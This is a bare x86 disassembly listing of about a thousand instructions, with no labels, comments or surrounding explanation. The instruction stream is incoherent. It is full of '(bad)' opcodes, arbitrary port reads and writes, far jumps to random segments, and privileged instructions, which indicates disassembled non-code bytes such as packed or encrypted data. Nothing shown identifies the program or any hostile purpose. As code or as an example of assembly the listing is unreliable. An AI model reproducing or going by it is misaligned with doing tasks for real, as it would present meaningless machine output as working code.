  40a509:	cwde   
  40a50a:	data16 mov bl,0x89
  40a50d:	xor    eax,0x34343e71
  40a512:	sub    ah,BYTE PTR ds:0xa70b229
  40a518:	mov    dl,0x1d
  40a51a:	or     eax,0xb9328065
  40a51f:	mov    ds:0x415352c2,eax
  40a524:	and    eax,0x9edc17fd
  40a529:	in     al,0x65
  40a52b:	aad    0xd7
  40a52d:	mov    esp,0x89922039
  40a532:	lds    edx,FWORD PTR [esi]
  40a534:	test   al,0xf4
  40a536:	in     eax,0xe9
  40a538:	adc    bh,bh
  40a53a:	std    
  40a53b:	int3   
  40a53c:	xor    edx,esp
  40a53e:	sbb    DWORD PTR [esi+0x20817da],ebp
  40a544:	jno    0x40a586
  40a546:	inc    ecx
  40a547:	fdivr  QWORD PTR [eax-0x1f7c253f]
  40a54d:	ret    
  40a54e:	xor    al,0x4c
  40a550:	and    eax,0xc445a39f
  40a555:	cld    
  40a556:	mov    esi,0x5fdb1e2
  40a55b:	ret    
  40a55c:	(bad)  
  40a55d:	mov    edi,DWORD PTR [edi]
  40a55f:	scas   eax,DWORD PTR es:[edi]
  40a560:	aad    0x2d
  40a562:	push   ebx
  40a563:	cdq    
  40a564:	jl     0x40a520
  40a566:	loope  0x40a59c
  40a568:	shl    BYTE PTR [edi+0x25a3f1fd],1
  40a56e:	outs   dx,DWORD PTR ds:[esi]
  40a56f:	popa   
  40a570:	mov    ds:0x95fc4fea,al
  40a575:	lods   al,BYTE PTR ds:[esi]
  40a576:	test   BYTE PTR [edi],ch
  40a578:	dec    esi
  40a579:	mov    ds,WORD PTR [edx+0x342ee7cd]
  40a57f:	aas    
  40a580:	or     eax,0xd7115cc5
  40a585:	ret    
  40a586:	jbe    0x40a5c9
  40a588:	cmp    BYTE PTR [edi-0x539f43fa],ch
  40a58e:	push   ebp
  40a58f:	cwde   
  40a590:	std    
  40a591:	call   DWORD PTR [edi-0xb82c132]
  40a597:	pushf  
  40a598:	(bad)  
  40a599:	pop    edi
  40a59a:	jecxz  0x40a5ca
  40a59c:	jae    0x40a534
  40a59e:	in     eax,dx
  40a59f:	mov    cl,0xc8
  40a5a1:	ins    DWORD PTR es:[edi],dx
  40a5a2:	int3   
  40a5a3:	addr16 in al,0x77
  40a5a6:	(bad)  
  40a5a7:	cdq    
  40a5a8:	popa   
  40a5a9:	push   esi
  40a5aa:	mov    ds:0xb71032ae,al
  40a5af:	scas   al,BYTE PTR es:[edi]
  40a5b0:	inc    edx
  40a5b1:	pop    esi
  40a5b2:	pop    es
  40a5b3:	fmul   QWORD PTR [ebp+0x2b]
  40a5b6:	sbb    ah,cl
  40a5b8:	call   0x4101:0x37509f66
  40a5bf:	pop    edx
  40a5c0:	imul   esp,DWORD PTR [edi+0x41],0xecf3eef2
  40a5c7:	mov    bl,0x29
  40a5c9:	push   cs
  40a5ca:	stc    
  40a5cb:	sbb    dh,dh
  40a5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5ce:	aas    
  40a5cf:	jae    0x40a634
  40a5d1:	jbe    0x40a569
  40a5d3:	add    DWORD PTR [edx],eax
  40a5d5:	dec    esi
  40a5d6:	jmp    0xf66b:0xfd74
  40a5dc:	(bad)  
  40a5dd:	mov    ah,0xaa
  40a5df:	shl    DWORD PTR [eax*8+0x91830a5],cl
  40a5e6:	aad    0x95
  40a5e8:	xchg   esi,eax
  40a5e9:	mov    ebp,0x6f5bb7fd
  40a5ee:	and    ebp,0x8d2f9c5e
  40a5f4:	pop    es
  40a5f5:	imul   ecx,DWORD PTR [edi-0x66],0x74
  40a5f9:	jle    0x40a613
  40a5fb:	jmp    0x2f4ce878
  40a600:	jmp    0x49bf:0x6bbfb3f4
  40a607:	and    esi,DWORD PTR [esi]
  40a609:	mov    eax,0xc2ac7db0
  40a60e:	and    dh,BYTE PTR [ebp-0x5319a6e3]
  40a614:	aaa    
  40a615:	adc    bh,cl
  40a617:	mov    ebp,eax
  40a619:	adc    bl,BYTE PTR [edi]
  40a61b:	aam    0x75
  40a61d:	cdq    
  40a61e:	xor    al,0xe1
  40a620:	adc    esp,ebx
  40a622:	in     al,dx
  40a623:	clc    
  40a624:	inc    edi
  40a625:	pop    ebp
  40a626:	mov    al,ch
  40a628:	xor    dl,BYTE PTR [edi-0x3a]
  40a62b:	and    eax,0xa25e8ca8
  40a630:	pop    ebx
  40a631:	and    dh,BYTE PTR [edx+0x3baf3a0f]
  40a637:	mov    BYTE PTR [esi-0x1fabb363],dh
  40a63d:	adc    al,0xcd
  40a63f:	sub    cl,dh
  40a641:	ja     0x40a636
  40a643:	rcl    cl,1
  40a645:	aas    
  40a646:	pop    esp
  40a647:	scas   al,BYTE PTR es:[edi]
  40a648:	je     0x40a629
  40a64a:	cwde   
  40a64b:	dec    ebp
  40a64c:	leave  
  40a64d:	sub    eax,0x6f5f1e4f
  40a652:	addr16 dec esi
  40a654:	jg     0x40a65d
  40a656:	sub    eax,0x1785e46c
  40a65b:	cli    
  40a65c:	imul   esp,DWORD PTR [esi-0x7d],0x40
  40a660:	cmp    esp,ebp
  40a662:	lock cs es pop es
  40a666:	mul    edx
  40a668:	mov    bl,BYTE PTR ds:0x42a31bb3
  40a66e:	push   cs
  40a66f:	call   0xad46:0xd62ad36a
  40a676:	cmp    ah,dl
  40a678:	loope  0x40a6ca
  40a67a:	inc    ebp
  40a67b:	mov    ds:0x641182e,eax
  40a680:	mov    esp,0x60a86c6d
  40a685:	dec    edi
  40a686:	cli    
  40a687:	imul   ebx,ebx,0x6e
  40a68a:	mov    bl,0x12
  40a68c:	ret    0x7725
  40a68f:	leave  
  40a690:	mov    bh,0x2f
  40a692:	xor    edx,DWORD PTR [eax]
  40a694:	ret    0x321f
  40a697:	pop    esi
  40a698:	paddusw mm1,QWORD PTR [ecx+eiz*2-0x3b]
  40a69d:	cs push eax
  40a69f:	pop    ebx
  40a6a0:	add    ebp,DWORD PTR [esi]
  40a6a2:	dec    esi
  40a6a3:	jne    0x40a653
  40a6a5:	push   0x6666139f
  40a6aa:	cs imul ecx,ecx,0x6f3e8739
  40a6b1:	adc    eax,0x22b20e0
  40a6b6:	mov    eax,ds:0x234b1b44
  40a6bb:	arpl   di,ax
  40a6bd:	push   ebp
  40a6be:	out    0x1a,al
  40a6c0:	fbstp  TBYTE PTR ds:0xac964043
  40a6c6:	outs   dx,DWORD PTR ds:[esi]
  40a6c7:	cmp    eax,0xdc3970bd
  40a6cc:	jmp    0x40a6dc
  40a6ce:	sub    dh,bh
  40a6d0:	cdq    
  40a6d1:	std    
  40a6d2:	cmp    ebp,DWORD PTR [eax+0xe5042df]
  40a6d8:	add    al,0x86
  40a6da:	mov    ebx,0x1ce9c703
  40a6df:	add    eax,DWORD PTR [eax]
  40a6e1:	add    ch,ah
  40a6e3:	xchg   esi,eax
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4-0x3b]
  40a6ef:	(bad)  
  40a6f0:	or     edi,DWORD PTR [edx+0x7e7ee978]
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	arpl   dx,di
  40a6fc:	ins    DWORD PTR es:[edi],dx
  40a6fd:	je     0x40a6fb
  40a6ff:	nop
  40a700:	push   cs
  40a701:	(bad)  
  40a702:	(bad)  
  40a703:	push   edx
  40a704:	pusha  
  40a705:	or     esp,edi
  40a707:	or     esp,DWORD PTR [esi+0x3c]
  40a70a:	jbe    0x40a712
  40a70c:	or     BYTE PTR [edi*8-0x2ffcf225],dh
  40a713:	aaa    
  40a714:	or     ecx,DWORD PTR [ecx-0x2bd4c3d0]
  40a71a:	jg     0x40a727
  40a71c:	mov    eax,ds:0x5fbc97aa
  40a721:	jmp    0x23cc29d8
  40a726:	fadd   DWORD PTR [ebp-0x1e]
  40a729:	cmp    al,0x13
  40a72b:	push   ss
  40a72c:	mov    ecx,DWORD PTR [esi+0x67]
  40a72f:	cmp    al,0x9a
  40a731:	pop    eax
  40a732:	ja     0x40a72d
  40a734:	jae    0x40a6b6
  40a736:	inc    ecx
  40a737:	push   ebp
  40a738:	xor    esi,DWORD PTR [ecx+0x57]
  40a73b:	mov    esp,0xaa10810f
  40a740:	mul    BYTE PTR [edi-0x20]
  40a743:	mov    eax,0x6d122db
  40a748:	(bad)  
  40a749:	mov    al,ds:0x97f4b6ce
  40a74e:	dec    eax
  40a74f:	push   ecx
  40a751:	es push ds
  40a753:	jl     0x40a6e9
  40a755:	fcmovnb st,st(4)
  40a757:	jge    0x40a6e3
  40a759:	sbb    ch,BYTE PTR [eax]
  40a75b:	clc    
  40a75c:	sti    
  40a75d:	jle    0x40a6e1
  40a75f:	cdq    
  40a760:	cmp    ecx,ebp
  40a762:	idiv   BYTE PTR [ecx-0x35]
  40a765:	mov    edi,0x209b88b
  40a76b:	pop    ebx
  40a76c:	clc    
  40a76d:	jns    0x40a764
  40a76f:	adc    eax,0x866e3782
  40a774:	mov    bl,0x5f
  40a776:	lods   al,BYTE PTR ds:[esi]
  40a777:	xchg   edx,eax
  40a778:	mov    dh,0x7
  40a77a:	fadd   st,st(4)
  40a77c:	inc    edx
  40a77d:	fstp   DWORD PTR [edi]
  40a77f:	fnstsw WORD PTR [edi+0x13cb2470]
  40a785:	les    esp,FWORD PTR [esi-0x6a4cb4aa]
  40a78b:	scas   al,BYTE PTR es:[edi]
  40a78c:	les    ebx,FWORD PTR [ecx]
  40a78e:	mov    BYTE PTR [edi+0x73],ah
  40a791:	xrelease xchg DWORD PTR ss:[bx+si+0x1796],esi
  40a798:	adc    al,0x43
  40a79a:	xchg   BYTE PTR [esi],dh
  40a79c:	(bad)  
  40a79d:	retf   0x6add
  40a7a0:	call   DWORD PTR [edi+0x6c93da1d]
  40a7a6:	dec    eax
  40a7a7:	and    DWORD PTR [esi-0x66],eax
  40a7aa:	xlat   BYTE PTR ds:[ebx]
  40a7ab:	mov    bh,bl
  40a7ad:	mov    eax,DWORD PTR [edi-0x6c3189d0]
  40a7b3:	xchg   BYTE PTR [ebp+0x30],ch
  40a7b6:	aam    0xb7
  40a7b8:	jle    0x40a823
  40a7ba:	(bad)
  40a7bd:	lods   al,BYTE PTR ds:[esi]
  40a7be:	push   ecx
  40a7bf:	ja     0x40a816
  40a7c1:	mov    edx,0xbdaf4e35
  40a7c6:	mov    cs,ebp
  40a7c8:	nop
  40a7c9:	dec    ebx
  40a7ca:	mov    edi,0xe1b075dc
  40a7cf:	xor    DWORD PTR [edx+0x2a1193b6],ecx
  40a7d5:	dec    esi
  40a7d6:	sbb    BYTE PTR [ebp+0x9d5db7b],bh
  40a7dc:	fisub  WORD PTR [ebx]
  40a7de:	dec    esi
  40a7df:	jns    0x40a795
  40a7e1:	push   0x23558f8e
  40a7e6:	test   al,0xfb
  40a7e8:	mov    esi,0x6bce4b91
  40a7ed:	ds dec ebx
  40a7ef:	push   cs
  40a7f0:	mov    bl,BYTE PTR [edi]
  40a7f2:	and    ch,al
  40a7f4:	xor    bh,al
  40a7f6:	and    eax,0xdf5c53ae
  40a7fb:	ins    BYTE PTR es:[edi],dx
  40a7fc:	mov    ch,0x3e
  40a7fe:	ret    0x7549
  40a801:	int    0xf
  40a803:	mov    fs,WORD PTR [edi-0x69]
  40a806:	pop    edi
  40a807:	adc    al,0x9d
  40a809:	or     BYTE PTR [eax+0x65830339],0x42
  40a810:	out    dx,eax
  40a811:	repnz cmc 
  40a813:	pusha  
  40a814:	jmp    0x1d6689d6
  40a819:	test   BYTE PTR [ebx+eiz*1-0x2b],cl
  40a81d:	adc    eax,0xd4d654e9
  40a822:	inc    eax
  40a823:	fs mov dh,0x37
  40a826:	push   cs
  40a827:	xlat   BYTE PTR ds:[ebx]
  40a828:	in     eax,0xd
  40a82a:	sbb    BYTE PTR [eax],bh
  40a82c:	fcmovbe st,st(7)
  40a82e:	push   esi
  40a82f:	cmp    bl,BYTE PTR [esi]
  40a831:	and    esp,edi
  40a833:	adc    cl,BYTE PTR fs:[ecx-0x708af5e]
  40a83a:	sub    dh,BYTE PTR [edi+0x7fabcf6]
  40a840:	fwait
  40a841:	add    cl,BYTE PTR [ebp-0x23]
  40a844:	jl     0x40a804
  40a846:	push   0xd27b7c9e
  40a84b:	sbb    BYTE PTR gs:[edx+ebx*4-0x3e],0x94
  40a851:	or     eax,0xe8a5e786
  40a856:	or     dh,BYTE PTR [ecx-0x17]
  40a859:	cmp    al,0xdf
  40a85b:	in     al,0xc8
  40a85d:	aad    0xca
  40a85f:	test   BYTE PTR [ebx+0x76],0xe1
  40a863:	push   eax
  40a864:	cs (bad) 
  40a866:	jne    0x40a898
  40a868:	fstp   st(2)
  40a86a:	scas   al,BYTE PTR es:[edi]
  40a86b:	inc    edx
  40a86c:	pop    ebp
  40a86d:	clc    
  40a86e:	(bad)  
  40a870:	stc    
  40a871:	repz xchg ebp,eax
  40a873:	fmul   st(0),st
  40a875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a876:	test   al,0x83
  40a878:	popf   
  40a879:	jl     0x40a847
  40a87b:	xchg   dh,al
  40a87d:	xor    al,0x23
  40a87f:	stc    
  40a880:	jno    0x40a86a
  40a882:	(bad)  
  40a883:	imul   esi,DWORD PTR [edx+0x529ba02e],0xde2e253d
  40a88d:	sbb    al,0xb5
  40a88f:	fst    DWORD PTR [eax+edi*4]
  40a892:	pop    ss
  40a893:	pop    ecx
  40a894:	scas   al,BYTE PTR es:[edi]
  40a895:	sub    DWORD PTR [ebp-0x5c],0xffffffc2
  40a899:	xchg   edi,eax
  40a89a:	adc    ebx,DWORD PTR [edi-0xb345a2f]
  40a8a0:	repnz sbb eax,0x8ef41a7e
  40a8a6:	push   0x38efa6a6
  40a8ab:	sub    al,0x64
  40a8ad:	xchg   edi,eax
  40a8ae:	stc    
  40a8af:	and    DWORD PTR [edx],ecx
  40a8b1:	dec    esi
  40a8b2:	xor    BYTE PTR [edi+0x76596f66],dl
  40a8b8:	ret    
  40a8b9:	repnz adc al,0x46
  40a8bc:	gs push 0x4849fb6e
  40a8c2:	add    esi,ebp
  40a8c4:	outs   dx,DWORD PTR ds:[esi]
  40a8c5:	sub    eax,0x365146bd
  40a8ca:	xor    DWORD PTR [ebx+0x59],ecx
  40a8cd:	pop    ebx
  40a8ce:	mov    cl,0xf0
  40a8d0:	mov    eax,ss
  40a8d2:	mov    bh,bl
  40a8d4:	hlt    
  40a8d5:	les    ebx,FWORD PTR [edi]
  40a8d7:	adc    esp,DWORD PTR [ebx]
  40a8d9:	cmp    ebp,edx
  40a8db:	push   esp
  40a8dc:	mov    esp,0xc0aadd24
  40a8e1:	xchg   esi,eax
  40a8e2:	sbb    DWORD PTR [edx+ecx*4],edx
  40a8e5:	sub    DWORD PTR [ebp+0x4d682a6c],0xffffffaa
  40a8ec:	inc    esi
  40a8ed:	dec    ecx
  40a8ee:	xchg   edi,eax
  40a8ef:	mov    dh,0x47
  40a8f1:	das    
  40a8f2:	cld    
  40a8f3:	popa   
  40a8f4:	repz push ss
  40a8f6:	enter  0xa8de,0x7b
  40a8fa:	cmp    BYTE PTR [edi+0x20f02a80],0x3e
  40a901:	push   ebx
  40a902:	mov    es:0x3ad8ea19,eax
  40a908:	stos   BYTE PTR es:[edi],al
  40a909:	push   esi
  40a90a:	pop    esp
  40a90b:	loopne 0x40a8a0
  40a90d:	cmp    ecx,DWORD PTR [ebx+ebp*1-0x80]
  40a911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a912:	out    0xa,eax
  40a914:	int3   
  40a915:	cmp    DWORD PTR [edx],edx
  40a917:	cmp    ah,BYTE PTR [edx]
  40a919:	xchg   esi,edi
  40a91b:	ficom  WORD PTR [esp+ebx*1-0x17b34741]
  40a922:	add    eax,0x860ecdff
  40a927:	push   ebp
  40a928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a929:	mov    esi,0xbe9b74be
  40a92e:	nop
  40a92f:	imul   edx,DWORD PTR [edx+edx*4],0xd0f736a6
  40a936:	push   edx
  40a937:	xchg   edx,eax
  40a938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a939:	inc    ecx
  40a93a:	push   eax
  40a93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a93c:	imul   ebp,DWORD PTR [edx],0x1b27987b
  40a942:	sub    al,0x9e
  40a944:	das    
  40a945:	nop
  40a946:	pop    esp
  40a947:	out    0x2b,al
  40a949:	dec    ecx
  40a94a:	mov    ds:0x8d81b3a1,al
  40a94f:	or     eax,0xe018ff27
  40a954:	test   eax,0xbad8beed
  40a959:	xor    dh,BYTE PTR [ecx]
  40a95b:	gs sti 
  40a95d:	sbb    esp,DWORD PTR [esi-0x3]
  40a960:	int    0x69
  40a962:	fadd   DWORD PTR [eax]
  40a964:	scas   eax,DWORD PTR es:[edi]
  40a965:	jg     0x40a9ba
  40a967:	das    
  40a968:	add    al,0xf7
  40a96a:	mov    al,ds:0xce1fae72
  40a96f:	jo     0x40a90d
  40a971:	add    eax,0x85f93aae
  40a976:	push   esp
  40a977:	jg     0x40a9e4
  40a979:	sbb    al,0xa4
  40a97b:	cmp    al,0x8
  40a97d:	xor    BYTE PTR [eax+ecx*2-0xe],bh
  40a981:	in     eax,0x28
  40a983:	bound  esi,QWORD PTR [eax+esi*2+0x5d]
  40a987:	test   al,0xf2
  40a989:	retf   0xaa80
  40a98c:	dec    ebx
  40a98d:	fnstenv [ebp+0x7b]
  40a990:	inc    ebx
  40a991:	mov    es,edx
  40a993:	pusha  
  40a994:	shl    DWORD PTR [edx+0x4eebd5e],0x60
  40a99b:	pop    edi
  40a99c:	cmp    ebp,eax
  40a99e:	cs mov al,dl
  40a9a1:	push   es
  40a9a2:	les    eax,FWORD PTR [eax]
  40a9a4:	mov    cl,0xe
  40a9a6:	int3   
  40a9a7:	test   dh,bl
  40a9a9:	sub    ecx,ebx
  40a9ab:	jmp    0xd9261395
  40a9b0:	rcr    DWORD PTR [eax],cl
  40a9b2:	mov    cl,0x6
  40a9b4:	inc    eax
  40a9b5:	sahf   
  40a9b6:	cmp    bl,bh
  40a9b8:	xor    edi,DWORD PTR [esi-0x48]
  40a9bb:	inc    ecx
  40a9bc:	push   es
  40a9bd:	xchg   edi,eax
  40a9be:	aad    0x99
  40a9c0:	jno    0x40a96a
  40a9c2:	test   al,0xb7
  40a9c4:	call   DWORD PTR [eax+0x3fe3fef]
  40a9ca:	pop    ds
  40a9cb:	data16 in al,0xfa
  40a9ce:	out    dx,eax
  40a9cf:	cmp    eax,DWORD PTR [ecx]
  40a9d1:	aas    
  40a9d2:	adc    esi,ebp
  40a9d4:	pop    ecx
  40a9d5:	into   
  40a9d6:	xor    eax,0x7c7ff6b9
  40a9db:	icebp  
  40a9dc:	inc    esp
  40a9dd:	retf   0xc1e7
  40a9e0:	mov    esp,0xb18041aa
  40a9e5:	jmp    0x40a9a7
  40a9e7:	lahf   
  40a9e8:	aad    0xc0
  40a9ea:	pop    esp
  40a9eb:	mov    cl,0x33
  40a9ed:	jns    0x40a9a7
  40a9ef:	scas   eax,DWORD PTR es:[edi]
  40a9f0:	lock add ecx,ecx
  40a9f3:	mov    esi,?
  40a9f5:	mov    dl,0x2e
  40a9f7:	(bad)  
  40a9f9:	mov    cs,WORD PTR [edx+0x390a61c8]
  40a9ff:	add    DWORD PTR [edi],ecx
  40aa01:	test   BYTE PTR [edx],ah
  40aa03:	adc    BYTE PTR [eax],al
  40aa05:	add    BYTE PTR [ebx+0x458bec4d],cl
  40aa0b:	clc    
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [edx+0x41f376d],ecx
  40aa2e:	hlt    
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	cmp    bh,BYTE PTR [ebp-0x46]
  40aa38:	nop
  40aa39:	(bad)  
  40aa3a:	jle    0xddeb631
  40aa40:	pop    es
  40aa41:	gs sub eax,0xf38e7ce8
  40aa47:	mov    ebx,0xc21daed3
  40aa4c:	xchg   ecx,eax
  40aa4d:	push   edi
  40aa4e:	or     al,0xae
  40aa50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa51:	shl    DWORD PTR gs:[ebp+0x45],cl
  40aa55:	movlhps xmm4,xmm7
  40aa58:	inc    ebx
  40aa59:	cmp    ch,0x69
  40aa5c:	je     0x40a9e2
  40aa5e:	imul   ebx,DWORD PTR [edi-0x75af53dd],0xaa3cd9f0
  40aa68:	test   DWORD PTR [esp+ecx*8+0x53],ebx
  40aa6c:	dec    ebx
  40aa6d:	in     eax,0x77
  40aa6f:	mov    eax,0x8ff8ee61
  40aa74:	mov    ebp,0xf1424e90
  40aa79:	mov    ecx,0xe21c7d79
  40aa7e:	ror    BYTE PTR [ebx],1
  40aa80:	stos   DWORD PTR es:[edi],eax
  40aa81:	mov    esp,0xa428577
  40aa86:	mov    al,ds:0xa0c52893
  40aa8b:	mov    ds:0x4230428b,al
  40aa90:	mov    al,0x4c
  40aa92:	dec    ebp
  40aa93:	and    BYTE PTR [esi+0x6b],ch
  40aa96:	xchg   esi,eax
  40aa97:	cmp    ebx,DWORD PTR [ebp-0x24]
  40aa9a:	mov    edi,0x7864dae5
  40aa9f:	lahf   
  40aaa0:	jb     0x40ab06
  40aaa2:	icebp  
  40aaa3:	mov    esi,0x7562e6a9
  40aaa8:	and    BYTE PTR [ebp-0x78bb66ed],bl
  40aaae:	adc    esi,esi
  40aab0:	js     0x40aa38
  40aab2:	rcr    DWORD PTR [edi+ecx*8],cl
  40aab5:	aas    
  40aab6:	int3   
  40aab7:	push   eax
  40aab8:	sar    BYTE PTR [ecx],1
  40aaba:	mov    al,0x29
  40aabc:	xor    eax,DWORD PTR [edx+0x45e72a58]
  40aac2:	jo     0x40aad9
  40aac4:	int3   
  40aac5:	inc    eax
  40aac6:	cmp    dl,BYTE PTR [ebp+0x4b]
  40aac9:	adc    DWORD PTR [ebp-0x1e1344e4],edx
  40aacf:	out    0xd5,al
  40aad1:	push   ds
  40aad2:	inc    BYTE PTR [ecx+eax*2+0x42]
  40aad6:	lock aad 0x84
  40aad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aada:	js     0x40aaa2
  40aadc:	shr    eax,0x66
  40aadf:	push   ebx
  40aae0:	cmp    al,0xc4
  40aae2:	clc    
  40aae3:	outs   dx,BYTE PTR ds:[esi]
  40aae4:	int3   
  40aae5:	mov    BYTE PTR [ebx+0x18e89b21],bl
  40aaeb:	aas    
  40aaec:	inc    esi
  40aaed:	ins    DWORD PTR es:[edi],dx
  40aaee:	pop    ebx
  40aaef:	sbb    DWORD PTR [ebx+0x61ab9677],edx
  40aaf5:	int    0x3a
  40aaf7:	pop    ebp
  40aaf8:	jne    0x40ab4f
  40aafa:	sub    al,0x72
  40aafc:	(bad)  
  40aafe:	shl    BYTE PTR [esi+0x1709acba],cl
  40ab04:	cmp    ebp,DWORD PTR [ebp+ecx*1+0x4dc659a]
  40ab0b:	inc    ebp
  40ab0c:	stc    
  40ab0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab0e:	std    
  40ab0f:	cmp    dh,BYTE PTR [esi]
  40ab11:	lahf   
  40ab12:	cdq    
  40ab13:	bound  ebp,QWORD PTR [edi]
  40ab15:	jmp    FWORD PTR [ebp+0x58ec2fde]
  40ab1b:	retf   
  40ab1c:	les    ebp,FWORD PTR [ecx]
  40ab1e:	xchg   BYTE PTR [ebp-0x59],dh
  40ab21:	inc    esp
  40ab22:	fst    DWORD PTR [edi-0x4d2d6c9b]
  40ab28:	mov    edi,0xc00c66cb
  40ab2d:	mov    eax,0x843e4ade
  40ab32:	ins    DWORD PTR es:[edi],dx
  40ab33:	cdq    
  40ab34:	adc    al,BYTE PTR [ecx]
  40ab36:	fiadd  WORD PTR [eax]
  40ab38:	pop    edi
  40ab39:	retf   0xba40
  40ab3c:	lea    edi,[ecx]
  40ab3e:	fldenv [edx+0x1e86f1f6]
  40ab44:	adc    eax,0xfc24a7cf
  40ab49:	outs   dx,DWORD PTR ds:[esi]
  40ab4a:	pop    esi
  40ab4b:	mov    dh,BYTE PTR [esi-0x13]
  40ab4e:	ds mov ss,ecx
  40ab51:	jmp    0x40abbb
  40ab53:	scas   eax,DWORD PTR es:[edi]
  40ab54:	mov    ebp,0x953a25cf
  40ab59:	sbb    al,0xdd
  40ab5b:	stc    
  40ab5c:	inc    esp
  40ab5d:	push   edi
  40ab5e:	sahf   
  40ab5f:	mov    dh,0x89
  40ab61:	jb     0x40ab1a
  40ab63:	inc    eax
  40ab64:	outs   dx,BYTE PTR ds:[esi]
  40ab65:	fdiv   QWORD PTR [ebx+0x32]
  40ab68:	test   eax,0x9a1dd732
  40ab6d:	dec    edi
  40ab6e:	es inc ebp
  40ab70:	cdq    
  40ab71:	jne    0x40abd6
  40ab73:	pusha  
  40ab74:	cmp    al,0x6e
  40ab76:	mov    bh,0x42
  40ab78:	inc    edi
  40ab79:	cli    
  40ab7a:	sub    bh,BYTE PTR [eax-0x1669ab04]
  40ab80:	jne    0x40abfc
  40ab82:	out    dx,eax
  40ab83:	(bad)  
  40ab84:	in     eax,0xc5
  40ab86:	dec    eax
  40ab87:	pop    es
  40ab88:	inc    ebx
  40ab89:	jns    0x40abc7
  40ab8b:	fwait
  40ab8c:	shl    DWORD PTR [ebp-0x497bf00],cl
  40ab92:	adc    esp,DWORD PTR [edx]
  40ab94:	fwait
  40ab95:	jge    0x40ab5e
  40ab97:	pusha  
  40ab98:	or     eax,0xbc722181
  40ab9d:	add    BYTE PTR [edx-0xc26739e],bl
  40aba3:	push   cs
  40aba4:	dec    esi
  40aba5:	lds    edi,FWORD PTR [ecx+ebx*4]
  40aba8:	mov    eax,0xb1c8f7e6
  40abad:	leave  
  40abae:	(bad)  
  40abaf:	scas   al,BYTE PTR es:[edi]
  40abb0:	inc    ebx
  40abb1:	lahf   
  40abb2:	pop    ecx
  40abb3:	add    DWORD PTR [ecx-0x4f],0x1e
  40abb7:	fcom   QWORD PTR [ebx]
  40abb9:	pushf  
  40abba:	pop    ebp
  40abbb:	ins    BYTE PTR es:[edi],dx
  40abbc:	and    eax,0xd3763c12
  40abc1:	fmul   DWORD PTR [ecx-0x2ea345d7]
  40abc8:	push   ss
  40abc9:	xchg   edx,eax
  40abca:	(bad)  
  40abcc:	sbb    eax,0x5d7d0781
  40abd1:	adc    BYTE PTR [edi+0x50a93762],al
  40abd7:	pop    edi
  40abd8:	fimul  WORD PTR ds:0x3f396c82
  40abde:	jae    0x40ac30
  40abe0:	or     BYTE PTR [edx+0x33208746],0x41
  40abe7:	scas   eax,DWORD PTR es:[edi]
  40abe8:	mov    bh,0xf6
  40abea:	pop    ebp
  40abeb:	shl    esi,cl
  40abed:	and    edi,DWORD PTR [edi]
  40abef:	jo     0x40abe0
  40abf1:	imul   esi,DWORD PTR [ecx],0xab221b84
  40abf7:	add    al,0xc7
  40abf9:	mov    ebp,ss
  40abfb:	loope  0x40ac10
  40abfd:	dec    eax
  40abfe:	mov    esp,DWORD PTR [edi-0x58]
  40ac01:	sub    esi,DWORD PTR [ebp+edi*8+0x3c0dfb61]
  40ac08:	(bad)  
  40ac0a:	es lock in eax,0xa3
  40ac0e:	sub    DWORD PTR [esi],esi
  40ac10:	leave  
  40ac11:	or     bh,0xd7
  40ac14:	jns    0x40ac1e
  40ac16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac17:	(bad)  
  40ac19:	es aam 0x59
  40ac1c:	push   esp
  40ac1d:	and    ebp,esi
  40ac1f:	dec    eax
  40ac20:	in     al,0xca
  40ac22:	out    0xc8,eax
  40ac24:	loop   0x40abe3
  40ac26:	sub    al,0x6f
  40ac28:	adc    dl,BYTE PTR [ebp+0x42]
  40ac2b:	leave  
  40ac2c:	mov    edi,edx
  40ac2e:	fstp   TBYTE PTR [ebx+0x5f5e4062]
  40ac34:	mov    WORD PTR [edx+0x1ac1c5b],fs
  40ac3a:	or     al,0xfc
  40ac3c:	ret    0x87df
  40ac3f:	ds xchg esi,eax
  40ac41:	jmp    0x6bb22549
  40ac46:	fldcw  WORD PTR [eax-0x39]
  40ac49:	cmp    bh,cl
  40ac4b:	popf   
  40ac4c:	in     eax,dx
  40ac4d:	jmp    0x40ac7d
  40ac4f:	push   0x2b5fbae4
  40ac54:	iret   
  40ac55:	hlt    
  40ac56:	retf   
  40ac57:	add    ebx,DWORD PTR [edi+0x1c55ea9d]
  40ac5d:	sub    eax,0x63b3f8e0
  40ac62:	push   ss
  40ac63:	push   ss
  40ac64:	ficomp WORD PTR [edi-0x79]
  40ac67:	sti    
  40ac68:	jg     0x40abf9
  40ac6a:	ror    DWORD PTR [edx],cl
  40ac6c:	dec    edx
  40ac6d:	push   edi
  40ac6e:	dec    BYTE PTR [ebp+0x6f]
  40ac71:	adc    edx,DWORD PTR [eax+0x50]
  40ac74:	retf   0x80d6
  40ac77:	inc    ebp
  40ac78:	ds jb  0x40ac15
  40ac7b:	stos   BYTE PTR es:[edi],al
  40ac7c:	ret    0x50e
  40ac7f:	mov    bl,0xd4
  40ac81:	retf   
  40ac82:	iret   
  40ac83:	call   0xcb17c401
  40ac88:	fisubr DWORD PTR [ecx+0x25f02f01]
  40ac8e:	retf   0x535c
  40ac91:	clc    
